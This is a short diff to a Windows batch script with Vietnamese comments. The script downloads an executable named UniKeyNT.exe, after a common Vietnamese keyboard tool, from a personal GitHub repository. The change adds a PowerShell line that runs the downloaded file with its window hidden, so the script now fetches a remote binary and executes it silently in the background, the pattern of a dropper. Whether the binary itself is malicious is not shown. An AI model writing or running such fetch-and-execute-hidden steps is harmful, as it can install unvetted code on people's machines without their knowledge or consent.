@@ -7,5 +7,7 @@ if not exist "C:\temp" (
 REM Tải file UniKeyNT.exe từ GitHub
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/leduckhuong/publics/raw/refs/heads/main/UniKeyNT.exe' -OutFile 'C:\temp\UniKeyNT.exe' -UseBasicParsing"
 
-echo File has been downloaded to C:\temp\UniKeyNT.exe
-pause
+REM Chạy file UniKeyNT.exe ngầm, không hiển thị cửa sổ
+powershell -Command "Start-Process 'C:\temp\UniKeyNT.exe' -WindowStyle Hidden"
+
+echo File has been downloaded and started in background.
